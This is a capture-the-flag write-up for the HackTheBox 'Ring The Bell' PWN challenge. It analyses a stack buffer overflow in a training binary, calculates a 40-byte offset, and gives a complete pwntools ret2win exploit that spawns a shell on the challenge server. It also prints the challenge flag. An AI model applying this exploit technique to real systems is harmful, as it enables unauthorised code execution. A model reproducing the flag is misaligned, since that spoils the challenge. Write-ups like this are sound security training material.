# 🔔 HackTheBox — Ring The Bell
### Category: `PWN` | Difficulty: `Easy` | Status: `Solved ✅`

---

## 📋 Challenge Description

> *Crownspire's fire-watch has one bell pattern that clears a street faster than any order could: three short tolls, a pause, then two long ones — the call for a granary fire. Rin got the pattern out of a watchman who'd had one drink too many. She has one chance to get past the door before the wagon reaches the river road.*

**Objective:** Exploit a binary to pop a shell and read `flag.txt`.

---

## 🔍 Reconnaissance

### Binary Identification
```bash
file ring_the_bell
# ELF 64-bit LSB executable, x86-64, dynamically linked, not stripped
```

### String Analysis
```bash
strings ring_the_bell
# Key findings:
# - /bin/sh        ← target
# - execl          ← win function uses this
# - read()         ← potential overflow vector
# - alarm()        ← time limit
```

### Security Mitigations
```
checksec --file=ring_the_bell

Arch:    amd64-64-little
RELRO:   Full RELRO
Stack:   No canary found    ✅ bypassable
NX:      NX enabled         ⚠️  no shellcode
PIE:     No PIE             ✅ static addresses
SHSTK:   Enabled            ⚠️  shadow stack
IBT:     Enabled            ⚠️  indirect branch tracking
```

---

## 🧠 Vulnerability Analysis

### Source (Ghidra Decompilation)

**`main()` — Vulnerable function:**
```c
undefined8 main(void) {
    undefined8 local_28;   // ← 32-byte buffer on stack
    undefined8 local_20;
    undefined8 local_18;
    undefined8 local_10;

    puts(banner);
    info("Rin! Ring the bell to call for reinforcements!\n\n[Rin]: ");
    fflush(stdout);

    local_28 = 0;
    local_20 = 0;
    local_18 = 0;
    local_10 = 0;

    read(0, &local_28, 0x60);  // ← reads 96 bytes into 32-byte buffer = OVERFLOW
    info("D-d-did they hear us..?\n");
    return 0;
}
```

**`bell()` — Win function:**
```c
void bell(void) {
    execl("/bin/sh", "sh", 0);  // ← spawns shell
    return;
}
```

### Vulnerability Type
**Classic Stack Buffer Overflow → ret2win**

| Detail | Value |
|--------|-------|
| Buffer size | 32 bytes (0x20) |
| Read size | 96 bytes (0x60) |
| Overflow amount | 64 bytes |
| Win function | `bell()` at `0x40176d` |
| IBT bypass | ✅ `bell()` starts with `endbr64` |

---

## 📐 Offset Calculation

### Method 1 — Manual (from decompilation)
```
local_28 @ rbp-0x20 = 32 bytes
+ saved rbp          =  8 bytes
─────────────────────────────
offset to RIP        = 40 bytes
```

### Method 2 — Dynamic (pwntools cyclic)
```bash
python3 -c "
from pwn import *
core = process('./ring_the_bell')
core.sendline(cyclic(96))
core.wait()
core = core.corefile
print('Offset:', cyclic_find(core.read(core.rsp, 4)))
"
# Output: Offset: 40  ✅
```

---

## 💥 Exploitation

### Strategy: **ret2win**
Since there is no PIE, `bell()`'s address is static. We overflow the buffer to overwrite the saved return address with `bell()`'s address. When `main()` returns, execution jumps to `bell()` → `execl("/bin/sh")` → shell.

IBT is satisfied because `bell()` starts with `endbr64` at `0x40176d`.

### Payload Structure
```
[ 'A' * 40 ][ 0x40176d (bell address) ]
  ↑ padding    ↑ overwrites saved RIP
```

---

## 🚩 Flag

```
HTB{R1ng4_R1ng4_R1111111nG_43627f0fbdfac30244a40cf9394655a1}
```

---

## 📜 Exploit Script

```python
#!/usr/bin/env python3
# HTB - Ring The Bell | PWN | ret2win
# Author: Panha

from pwn import *

# ─── Config ───────────────────────────────────────────────
elf = ELF('./ring_the_bell', checksec=True)

LOCAL = False  # Set True to test locally

HOST = '154.57.164.73'
PORT = 31182

# ─── Addresses ────────────────────────────────────────────
bell_addr = 0x40176d   # bell() → execl("/bin/sh", "sh", 0)
                       # starts with endbr64 — IBT compliant

# ─── Offset ───────────────────────────────────────────────
# Buffer (0x20=32) + saved rbp (8) = 40
OFFSET = 40

# ─── Exploit ──────────────────────────────────────────────
def exploit():
    if LOCAL:
        p = process('./ring_the_bell')
    else:
        p = remote(HOST, PORT)

    payload  = b'A' * OFFSET       # padding to reach RIP
    payload += p64(bell_addr)      # overwrite RIP → bell()

    p.recvuntil(b'[Rin]:')
    p.sendline(payload)

    log.success(f'Payload sent ({len(payload)} bytes)')
    log.success(f'Jumping to bell() @ {hex(bell_addr)}')

    p.interactive()

# ─── Run ──────────────────────────────────────────────────
if __name__ == '__main__':
    exploit()
```

---

## 🔧 Tools Used

| Tool | Purpose |
|------|---------|
| `file` | Binary identification |
| `strings` | Static string analysis |
| `checksec` | Security mitigations |
| `objdump -d` | Disassembly |
| `Ghidra` | Decompilation / reverse engineering |
| `ROPgadget` | ROP gadget search |
| `pwntools` | Exploit development & cyclic offset finding |

---

## 📚 Key Concepts

- **Stack Buffer Overflow** — writing beyond a buffer's bounds to overwrite adjacent stack data including the return address
- **ret2win** — redirecting execution to an existing function in the binary that gives an advantage (here: a shell)
- **IBT (Indirect Branch Tracking)** — CET feature requiring valid branch targets to begin with `endbr64`; satisfied here since `bell()` does
- **No PIE** — binary loaded at fixed address `0x400000`, making all symbol addresses static and predictable

---

*Writeup by Panha · HackTheBox Blue Team Labs*
